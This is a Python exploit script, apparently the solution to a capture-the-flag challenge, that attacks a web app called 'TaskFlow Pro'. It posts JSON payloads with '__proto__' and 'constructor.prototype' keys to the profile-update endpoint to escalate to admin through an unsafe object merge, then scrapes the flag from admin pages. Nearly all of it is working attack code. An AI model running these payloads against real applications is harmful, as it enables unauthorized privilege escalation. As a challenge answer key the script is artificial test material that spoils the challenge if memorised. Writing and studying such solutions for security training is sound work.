#!/usr/bin/env python3

import requests
import json
import sys
import re

def analyze_application(base_url):
    """Analyze the target application to understand its structure"""
    print("[+] Analyzing TaskFlow Pro application...")
    
    session = requests.Session()
    
    # Check main page
    response = session.get(f"{base_url}/")
    if response.status_code != 200:
        print(f"[-] Cannot access application: {response.status_code}")
        return None
    
    print("[+] Application accessible - TaskFlow Pro detected")
    
    # Check API endpoints
    status_response = session.get(f"{base_url}/api/system/status")
    if status_response.status_code == 200:
        status_data = status_response.json()
        print(f"[+] System status: {status_data.get('status')}")
        print(f"[+] Version: {status_data.get('version')}")
        print(f"[+] Admin access: {status_data.get('admin_access')}")
        print(f"[+] Debug mode: {status_data.get('debug_mode')}")
    
    # Check settings page
    settings_response = session.get(f"{base_url}/settings")
    if settings_response.status_code == 200 and "Advanced Configuration" in settings_response.text:
        print("[+] Advanced settings panel detected")
        print("[+] JSON configuration functionality available")
    
    return session

def exploit_profile_merge(base_url):
    print("[+] Starting exploitation of TaskFlow Pro...")
    
    session = analyze_application(base_url)
    if not session:
        return False
    
    print("[2] Testing profile update functionality...")
    
    # First, try a simple profile update to understand the structure
    simple_profile = {
        "user_preferences": {
            "theme": "dark",
            "notifications": {"email": True, "push": False}
        }
    }
    
    response = session.post(f"{base_url}/update_profile", 
                          data={'profile_data': json.dumps(simple_profile)})
    
    if response.status_code != 200:
        print("[-] Profile update mechanism not working")
        return False
    
    print("[+] Profile update mechanism confirmed")
    
    print("[3] Attempting privilege escalation via nested configuration...")
    
    # Craft payload to exploit the merge_user_preferences function
    exploit_payload = {
        "user_preferences": {
            "theme": "professional",
            "dashboard": {
                "layout": "advanced",
                "__proto__": {
                    "admin_access": True,
                    "debug_mode": True
                }
            }
        },
        "system_config": {
            "feature_toggles": {
                "advanced_features": True,
                "__proto__": {
                    "admin_access": True
                }
            }
        },
        "__proto__": {
            "admin_access": True,
            "debug_mode": True,
            "maintenance_mode": False
        },
        "admin_access": True,
        "debug_mode": True
    }
    
    response = session.post(f"{base_url}/update_profile", 
                          data={'profile_data': json.dumps(exploit_payload)})
    
    print("[+] Exploit payload sent")
    
    print("[4] Verifying privilege escalation...")
    
    # Check if admin access was gained
    status_response = session.get(f"{base_url}/api/system/status")
    if status_response.status_code == 200:
        status_data = status_response.json()
        if status_data.get('admin_access'):
            print("[+] Admin access gained!")
            
            # Try to get the flag from API endpoint
            flag_response = session.get(f"{base_url}/api/admin/flag")
            if flag_response.status_code == 200:
                flag_data = flag_response.json()
                if 'flag' in flag_data:
                    print(f"[+] FLAG: {flag_data['flag']}")
                    return True
    
    # Check main page for admin panel
    main_response = session.get(f"{base_url}/")
    if "Administrative Access Granted" in main_response.text:
        print("[+] Admin panel visible on main page")
        flag_match = re.search(r'SYSTEM FLAG:</strong>\s*([^<]+)', main_response.text)
        if flag_match:
            flag = flag_match.group(1).strip()
            print(f"[+] FLAG: {flag}")
            return True
    
    # Try accessing admin panel directly
    admin_response = session.get(f"{base_url}/admin")
    if admin_response.status_code == 200 and "SYSTEM FLAG:" in admin_response.text:
        print("[+] Direct admin panel access successful")
        flag_match = re.search(r'SYSTEM FLAG:</strong>\s*([^<]+)', admin_response.text)
        if flag_match:
            flag = flag_match.group(1).strip()
            print(f"[+] FLAG: {flag}")
            return True
    
    print("[5] Trying alternative exploitation method...")
    
    # Alternative payload structure with more nested pollution
    alt_payload = {
        "profile_settings": {
            "customization": {
                "advanced": {
                    "__proto__": {
                        "admin_access": True,
                        "debug_mode": True
                    }
                }
            }
        },
        "constructor": {
            "prototype": {
                "admin_access": True,
                "debug_mode": True
            }
        },
        "app_config": {
            "__proto__": {
                "admin_access": True
            }
        }
    }
    
    session.post(f"{base_url}/update_profile", 
                data={'profile_data': json.dumps(alt_payload)})
    
    # Check again
    main_response = session.get(f"{base_url}/")
    if "SYSTEM FLAG:" in main_response.text:
        flag_match = re.search(r'SYSTEM FLAG:</strong>\s*([^<]+)', main_response.text)
        if flag_match:
            flag = flag_match.group(1).strip()
            print(f"[+] FLAG: {flag}")
            return True
    
    print("[-] Exploitation failed")
    return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 solve.py <target_url>")
        print("Example: python3 solve.py http://localhost:5000")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    
    print(f"[+] Target: {target_url}")
    print("[+] TaskFlow Pro Exploitation Script")
    print("[+] ===================================")
    
    try:
        success = exploit_profile_merge(target_url)
        if success:
            print("\n[+] Exploitation successful!")
            print("[+] TaskFlow Pro has been compromised!")
        else:
            print("\n[-] Exploitation failed!")
            print("[-] Target may not be vulnerable or accessible")
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    main()
